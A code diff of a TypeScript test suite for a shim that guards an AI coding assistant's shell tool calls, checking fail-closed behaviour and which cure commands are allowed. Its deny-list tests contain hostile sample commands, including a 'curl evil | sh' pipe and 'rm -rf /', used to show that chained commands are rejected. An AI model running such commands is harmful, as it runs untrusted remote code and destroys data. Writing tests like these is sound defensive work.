@@ -3,7 +3,7 @@ import * as fs from 'fs';
 import * as path from 'path';
 
 import { SyncFlowGuidance } from '@webpieces/rules-config';
-import { SHIM_VERSION_STAMP, UPGRADE_SHIM_CMD, INSTALLER_ALLOW_ERE, INSTALLER_ALLOW_JS, RECOVERY_ALLOW_ERE, RECOVERY_ALLOW_JS, SYNC_ALLOW_ERE, SYNC_ALLOW_JS, UPGRADE_SHIM_ALLOW_ERE, UPGRADE_SHIM_ALLOW_JS, RESTORE_SHIM_ALLOW_ERE, RESTORE_SHIM_ALLOW_JS, RESTORE_SHIM_CMD, INSTALL_HOOKS_ALLOW_ERE, INSTALL_HOOKS_ALLOW_JS, INSTALL_HOOKS_CMD, NO_CHAINING_RULE, renderShim } from './shim';
+import { UPGRADE_SHIM_CMD, INSTALLER_ALLOW_ERE, INSTALLER_ALLOW_JS, RECOVERY_ALLOW_ERE, RECOVERY_ALLOW_JS, SYNC_ALLOW_ERE, SYNC_ALLOW_JS, UPGRADE_SHIM_ALLOW_ERE, UPGRADE_SHIM_ALLOW_JS, RESTORE_SHIM_ALLOW_ERE, RESTORE_SHIM_ALLOW_JS, RESTORE_SHIM_CMD, INSTALL_HOOKS_ALLOW_ERE, INSTALL_HOOKS_ALLOW_JS, INSTALL_HOOKS_CMD, NO_CHAINING_RULE, renderShim, shimPath, committedShimStale, isShimCureCommand, shimStaleDenyReason } from './shim';
 import { ShimTestkit } from './shim-testkit';
 
 const kit = new ShimTestkit();
@@ -195,161 +195,105 @@ describe('version-drift guard — permitting the CURE for each direction', () =>
 });
 
 /**
- * The committed-shim SELF-GUARD. .claude/webpieces/ai-hook.sh is webpieces-managed (generated from
- * renderShim(), byte-identical to the shipped template). If it is reverted or hand-edited it no longer
- * matches the installed template, so the shim fails CLOSED rather than run stale escape-hatch logic —
- * and allows only the cures through (the cp of the template, and wp-upgrade-shim). The testkit always
- * writes the committed shim as renderShim(); we stage the INSTALLED template to control whether the two
- * agree, plus that package's package.json so the deny can quote the version it would restore.
+ * The committed-shim SELF-GUARD — now enforced by the guards BINARY, not the rendered shim (moved
+ * 2026-07-24). .claude/webpieces/ai-hook.sh is webpieces-managed (generated from renderShim()); if it
+ * is reverted, hand-edited, or predates the installed binary it no longer matches renderShim(). The
+ * shim used to `cmp` itself and fail closed — a double-edged trap (the check lived in the file it was
+ * guarding). Now the shim just checks drift + bin-presence and hands off; the CURRENT binary compares
+ * (committedShimStale), fails closed with shimStaleDenyReason(), and lets ONLY the three cures through
+ * (isShimCureCommand) so the AI can re-arm it. These drive those functions directly — the binary's
+ * decision is exercised via runMain in hook-core, but the LOGIC is these three pure functions.
+ *
+ * Stage a repo root that owns a committed shim at shimPath(root) with the given contents (null = none).
  */
-function stageShimGuardRoot(templateContent: string | null, installedVersion = '0.4.407'): string {
+function stageCommittedShim(content: string | null): string {
     const root = kit.mktmp();
-    const binDir = path.join(root, 'node_modules', '.bin');
-    fs.mkdirSync(binDir, { recursive: true });
-    fs.writeFileSync(path.join(binDir, 'wp-ai-guards-hook'), '#!/bin/sh\nprintf EXECED\n', { mode: 0o755 });
-    if (templateContent !== null) {
-        const pkgDir = path.join(root, 'node_modules', '@webpieces', 'ai-hook-rules');
-        fs.mkdirSync(path.join(pkgDir, 'templates'), { recursive: true });
-        fs.writeFileSync(path.join(pkgDir, 'templates', 'ai-hook.sh'), templateContent);
-        fs.writeFileSync(path.join(pkgDir, 'package.json'), `{"name":"@webpieces/ai-hook-rules","version":"${installedVersion}"}`);
+    if (content !== null) {
+        const p = shimPath(root);
+        fs.mkdirSync(path.dirname(p), { recursive: true });
+        fs.writeFileSync(p, content);
     }
     return root;
 }
 
-describe('committed-shim self-guard — managed file reverted/edited', () => {
-    it('execs the bin when the committed shim matches the installed template (no tampering)', () => {
-        const out = kit.runShim(stageShimGuardRoot(renderShim()), 'wp-ai-guards-hook', kit.bashPayload('git status'));
-        expect(out.stdout).toBe('EXECED');
+describe('committedShimStale — detecting a reverted/hand-edited/older committed shim', () => {
+    it('false when the committed shim matches renderShim() (no tampering)', () => {
+        expect(committedShimStale(stageCommittedShim(renderShim()))).toBe(false);
     });
 
-    it('DENIES (fail-closed) when the committed shim differs from the installed template', () => {
-        // The committed shim is renderShim(); a template with an extra byte models a revert/hand-edit.
-        const out = kit.runShim(stageShimGuardRoot(renderShim() + '\n# tampered\n'), 'wp-ai-guards-hook', kit.bashPayload('git status'));
-        expect(out.stdout).not.toContain('EXECED'); // stale escape-hatch logic did NOT run
-        expect(out.isDenied()).toBe(true);
-        const reason = out.denyReason();
-        expect(reason).toContain('webpieces-managed file was changed');
-        expect(reason).toContain('must NOT be reverted');
-        expect(reason).toContain('wp-upgrade-shim'); // the one allowlisted cure
+    it('true when the committed shim differs (revert / hand-edit / older logic)', () => {
+        expect(committedShimStale(stageCommittedShim(renderShim() + '\n# tampered\n'))).toBe(true);
     });
 
-    it('omits the version note (rather than printing an empty one) when it cannot be read', () => {
-        const root = stageShimGuardRoot(renderShim() + '\n# tampered\n');
-        fs.rmSync(path.join(root, 'node_modules', '@webpieces', 'ai-hook-rules', 'package.json'));
-        const reason = kit.runShim(root, 'wp-ai-guards-hook', kit.bashPayload('git status')).denyReason();
-        expect(reason).toContain(UPGRADE_SHIM_CMD);   // the cure survives an unreadable version
-        expect(reason).not.toContain('installed version )');
-        expect(reason).not.toContain('()');
+    it('false when there is NO committed shim (fresh clone / global install — nothing to guard)', () => {
+        expect(committedShimStale(stageCommittedShim(null))).toBe(false);
     });
+});
 
-    it('lets the cp through — it is OPTION 3, and a legacy install has nothing else', () => {
-        const root = stageShimGuardRoot(renderShim() + '\n# tampered\n');
-        const out = kit.runShim(root, 'wp-ai-guards-hook', kit.bashPayload(RESTORE_SHIM_CMD));
-        expect(out.isDenied()).toBe(false);
-        expect(out.stdout.trim()).toBe(''); // silent allow
-    });
-
-    it('lets every advertised cure through so the block is not a deadlock', () => {
-        const root = stageShimGuardRoot(renderShim() + '\n# tampered\n');
-        for (const cmd of [INSTALL_HOOKS_CMD, UPGRADE_SHIM_CMD, RESTORE_SHIM_CMD]) {
-            const out = kit.runShim(root, 'wp-ai-guards-hook', kit.bashPayload(cmd));
-            expect(out.isDenied(), `advertised cure must be allowed: ${cmd}`).toBe(false);
-            expect(out.stdout.trim()).toBe(''); // silent allow
+describe('isShimCureCommand — only the three cures pass while the self-guard blocks everything', () => {
+    it('allows exactly the three cures, including the 2>&1 | tail spelling an assistant actually types', () => {
+        const allow = [
+            INSTALL_HOOKS_CMD, UPGRADE_SHIM_CMD, RESTORE_SHIM_CMD,
+            `${INSTALL_HOOKS_CMD} 2>&1 | tail -20`,
+            'pnpm exec wp-upgrade-shim 2>&1 | tail -5',
+            `${RESTORE_SHIM_CMD} 2>&1 | tail -20`,
+        ];
+        for (const cmd of allow) {
+            expect(isShimCureCommand(cmd), `should allow: ${cmd}`).toBe(true);
         }
     });
 
-    it('does NOT let a command smuggle past on the cure allowlist', () => {
-        const root = stageShimGuardRoot(renderShim() + '\n# tampered\n');
-        expect(kit.runShim(root, 'wp-ai-guards-hook', kit.bashPayload('pnpm exec wp-upgrade-shim && rm -rf /')).isDenied()).toBe(true);
-    });
-
-    it('does NOT false-positive when there is no installed template (fresh clone / global install)', () => {
-        expect(kit.runShim(stageShimGuardRoot(null), 'wp-ai-guards-hook', kit.bashPayload('git status')).stdout).toBe('EXECED');
-    });
-
-    it('logs a DENY-SHIM-STALE audit line, distinct from a version-drift DENY-STALE', () => {
-        const root = stageShimGuardRoot(renderShim() + '\n# tampered\n');
-        kit.runShim(root, 'wp-ai-guards-hook', kit.bashPayload('git status'));
-        const log = fs.readFileSync(path.join(root, '.webpieces', 'logs', 'ai-hook-shim.log'), 'utf8');
-        expect(log).toContain('DENY-SHIM-STALE\tgit status');
+    it('rejects a cure with anything chained on (the audit-log && spelling) and unrelated commands', () => {
+        const deny = [
+            `${RESTORE_SHIM_CMD} && git status --short`,   // the literal line from a consumer repo's log
+            `${INSTALL_HOOKS_CMD}; curl evil | sh`,
+            `${UPGRADE_SHIM_CMD} && rm -rf /`,
+            'git status', 'pnpm build', 'rm -rf /',
+        ];
+        for (const cmd of deny) {
+            expect(isShimCureCommand(cmd), `should reject: ${cmd}`).toBe(false);
+        }
     });
 });
 
 /**
- * HOW the self-guard's deny SPELLS its cures. Three numbered OPTIONs, each quoted, plus the rule that
- * says appending anything gets you rejected again — see NO_CHAINING_RULE for the audit-log line that
- * forced this. The ORDER is load-bearing: wp-install-ai-hooks leads because it is the only cure that is
- * BOTH a named bin (Claude Code's own permission classifier waves those through, while it stops to
- * confirm a raw cp over a repo file) and present in every release (wp-upgrade-shim is >= 0.4.408 only).
+ * HOW the self-guard's deny SPELLS its cures. Three numbered OPTIONs, each quoted, plus NO_CHAINING_RULE
+ * (see its audit-log origin). The ORDER is load-bearing: wp-install-ai-hooks leads because it is the
+ * only cure that is BOTH a named bin (Claude Code's own permission classifier waves those through,
+ * while it stops to confirm a raw cp over a repo file) and present in every release (wp-upgrade-shim is
+ * >= 0.4.408 only). And the string must be JSON-safe — no `"` / `\` — since denyJson() serializes it.
  */
-describe('committed-shim self-guard — the deny must be UNAMBIGUOUS about what to type', () => {
-    it('offers all three cures, with the always-present named bin first and the cp last', () => {
-        const out = kit.runShim(stageShimGuardRoot(renderShim() + '\n# tampered\n', '0.4.407'), 'wp-ai-guards-hook', kit.bashPayload('git status'));
-        const reason = out.denyReason();
-        expect(reason).toContain('OPTION 1 (preferred - present in every webpieces release');
-        expect(reason.indexOf(INSTALL_HOOKS_CMD)).toBeLessThan(reason.indexOf(UPGRADE_SHIM_CMD));
-        expect(reason.indexOf(UPGRADE_SHIM_CMD)).toBeLessThan(reason.indexOf(RESTORE_SHIM_CMD));
-        expect(reason).toContain('0.4.407');              // WHICH version's shim it restores
-        expect(reason).toContain('0.4.408');              // and that older installs lack option 2
-    });
+describe('shimStaleDenyReason — unambiguous, JSON-safe, not a deadlock', () => {
+    const reason = shimStaleDenyReason('0.4.431');
 
-    it('quotes each cure and spells out that appending && gets it rejected again', () => {
-        const reason = kit.runShim(stageShimGuardRoot(renderShim() + '\n# tampered\n'), 'wp-ai-guards-hook', kit.bashPayload('git status')).denyReason();
+    it('offers all three cures, quoted EXACTLY, named bin first and the cp last, with the version note', () => {
+        expect(reason).toContain('installed version 0.4.431');
+        expect(reason).toContain('OPTION 1 (preferred - present in every webpieces release');
         for (const cmd of [INSTALL_HOOKS_CMD, UPGRADE_SHIM_CMD, RESTORE_SHIM_CMD]) {
             expect(reason).toContain(`run EXACTLY this command: '${cmd}'`);
         }
+        expect(reason.indexOf(INSTALL_HOOKS_CMD)).toBeLessThan(reason.indexOf(UPGRADE_SHIM_CMD));
+        expect(reason.indexOf(UPGRADE_SHIM_CMD)).toBeLessThan(reason.indexOf(RESTORE_SHIM_CMD));
+    });
+
+    it('carries the no-chaining rule and states plainly it is NOT a deadlock', () => {
         expect(reason).toContain(NO_CHAINING_RULE);
         expect(reason).toContain('do NOT append && anything');
+        expect(reason).toContain('NOT A DEADLOCK');
+        expect(reason).toContain('ALLOWED');
+        expect(reason).not.toContain('Every tool call is blocked'); // the unqualified claim that read as deadlock
     });
 
-    // A deny REASON is interpolated into a `REASON="…"` shell assignment and then printf'd into a JSON
-    // string. A double quote or a backslash would break BOTH — silently corrupting the decision payload
-    // rather than just the text. That is why the OPTIONs are quoted with apostrophes; keep it that way.
-    it('keeps the deny reason free of the characters that would corrupt the decision JSON', () => {
-        const reason = kit.runShim(stageShimGuardRoot(renderShim() + '\n# tampered\n'), 'wp-ai-guards-hook', kit.bashPayload('git status')).denyReason();
+    it('omits the version note (no empty parens) when the installed version is unknown', () => {
+        const r = shimStaleDenyReason('');
+        expect(r).not.toContain('installed version )');
+        expect(r).not.toContain('()');
+        expect(r).toContain(INSTALL_HOOKS_CMD); // the cure survives an unreadable version
+    });
+
+    it('contains no double-quote or backslash (either would corrupt the PreToolUse decision JSON)', () => {
         expect(reason).not.toContain('"');
         expect(reason).not.toContain('\\');
-    });
-});
-
-/**
- * The 2026-07-21 report: the self-guard fired, and the assistant answered "chicken-and-egg — I can't
- * run the fix because the hook intercepts it first", stopped, and asked the human to run it. The cure
- * WAS allowlisted the whole time. Two things put it there, and both are locked here.
- */
-describe('committed-shim self-guard — the deny must not READ like a deadlock', () => {
-    // Part 1: the text asserted a flat "Every tool call is blocked" and then named a command to run.
-    // Read together, those two sentences say "the guard blocks its own fix" — so the reader never tried
-    // it. The deny must state the cure is allowed through, exactly as the drift branch always has.
-    it('says the cure is ALLOWED through, so the reader does not conclude deadlock', () => {
-        const reason = kit.runShim(stageShimGuardRoot(renderShim() + '\n# tampered\n'), 'wp-ai-guards-hook', kit.bashPayload('git status')).denyReason();
-        expect(reason).toContain('ALLOWED');
-        expect(reason).toContain('NOT A DEADLOCK');
-        expect(reason).not.toContain('Every tool call is blocked'); // the unqualified claim that caused it
-    });
-
-    // Part 2: an assistant spells a diagnostic command `<cmd> 2>&1 | tail -20`. The cure allowlists were
-    // anchored to a BARE command, so the natural spelling was DENIED with this very message — turning
-    // "the guard blocks its own fix" from a misreading into an observation. Both cures survive the tail.
-    it('lets the cures through when spelled the way an assistant actually writes them', () => {
-        const root = stageShimGuardRoot(renderShim() + '\n# tampered\n');
-        for (const cmd of [`${RESTORE_SHIM_CMD} 2>&1 | tail -20`, 'pnpm exec wp-upgrade-shim 2>&1 | tail -5', `${INSTALL_HOOKS_CMD} 2>&1 | tail -20`]) {
-            const out = kit.runShim(root, 'wp-ai-guards-hook', kit.bashPayload(cmd));
-            expect(out.isDenied()).toBe(false);
-            expect(out.stdout.trim()).toBe(''); // silent allow
-        }
-    });
-
-    // Part 3 (2026-07-23): the literal line from a consumer repo's .webpieces/logs/ai-hook-shim.log —
-    // the prescribed cure, verbatim, with `&& git status --short` welded on. It is denied, and it MUST
-    // stay denied: widening the hatch to `&& <anything>` would let `cp … && rm -rf /` through, and the
-    // whole point of a fail-closed escape hatch is that no operator rides along. So the deny is correct
-    // and the TEXT is the fix — the reason must tell the reader, in words, why their spelling bounced.
-    it('still denies the cure+&& spelling from the audit log, and explains why in the reason', () => {
-        const root = stageShimGuardRoot(renderShim() + '\n# tampered\n');
-        const out = kit.runShim(root, 'wp-ai-guards-hook', kit.bashPayload(`${RESTORE_SHIM_CMD} && git status --short`));
-        expect(out.isDenied()).toBe(true);
-        expect(out.denyReason()).toContain('do NOT append && anything');
     });
 });
 
@@ -524,32 +468,28 @@ describe('output-capture tail on every fail-closed escape hatch (ERE ↔ JS twin
 });
 
 /**
- * The VERSION STAMP in line 2 of the shim. Until now the committed .claude/webpieces/ai-hook.sh — the
- * file that decides every tool call — carried no clue which webpieces wrote it, so "is this repo's
- * guard old enough to lack the cure?" could only be answered by diffing it against an npm tarball.
- *
- * The dangerous failure mode is a HALF stamp. The self-guard cmp's the committed shim against
- * templates/ai-hook.sh, and the committed shim is written by renderShim() inside the compiled JS — two
- * artifacts, one comparison. Stamp only one and EVERY consumer repo fail-closes forever on a phantom
- * hand-edit. scripts/set-version.sh therefore replaces the token everywhere under dist/ and then
- * verifies none survived; these lock the invariants that make that safe.
+ * NO VERSION STAMP (removed 2026-07-24). The shim used to carry `# webpieces shim version: <v> (<sha>)`
+ * on line 2, rewritten every release by set-version.sh. That made the committed .claude/webpieces/
+ * ai-hook.sh go byte-different on EVERY upgrade even when the logic was identical, so the committed-shim
+ * self-guard tripped on every bump over a comment (the DENY-SHIM-STALE churn) — and it carried its own
+ * half-stamp hazard (stamp one lockstep artifact and not the other → every consumer fail-closes forever).
+ * These lock the invariant that makes `pnpm install` the fix for almost everything: the shim is
+ * version-AGNOSTIC and byte-STABLE across releases, so the self-guard fires ONLY on a real logic change.
  */
-describe('shim version stamp (set-version.sh replaces it at publish)', () => {
-    it('renders the placeholder in the source tree — an unstamped shim came from a checkout', () => {
-        expect(renderShim()).toContain(`# webpieces shim version: ${SHIM_VERSION_STAMP}`);
+describe('shim carries NO version stamp (so it does not drift per release)', () => {
+    it('renders no version-stamp line', () => {
+        expect(renderShim()).not.toContain('# webpieces shim version:');
+        expect(renderShim()).not.toContain('REPLACEME_GIT_HASH_VERSION');
     });
 
-    it('stamps in LOCKSTEP: the shipped template and renderShim() stay byte-identical after the swap', () => {
-        // Exactly what publishing does to the two artifacts, applied here to prove they cannot diverge.
+    it('shipped template equals renderShim() byte-for-byte with no stamp substitution needed', () => {
         const template = fs.readFileSync(path.join(process.cwd(), 'packages/tooling/ai-hook-rules/templates/ai-hook.sh'), 'utf8');
-        const stamp = (s: string): string => s.split(SHIM_VERSION_STAMP).join('0.4.999 (deadbee)');
-        expect(stamp(template)).toBe(stamp(renderShim()));
-        expect(stamp(renderShim())).not.toContain(SHIM_VERSION_STAMP); // nothing left unstamped
+        expect(template).toBe(renderShim());
     });
 
-    it('is the same token scripts/set-version.sh looks for (drift between the two ships unstamped)', () => {
+    it('set-version.sh no longer looks for the shim stamp placeholder', () => {
         const script = fs.readFileSync(path.join(process.cwd(), 'scripts/set-version.sh'), 'utf8');
-        expect(script).toContain(`PLACEHOLDER="${SHIM_VERSION_STAMP}"`);
+        expect(script).not.toContain('REPLACEME_GIT_HASH_VERSION');
     });
 });
 
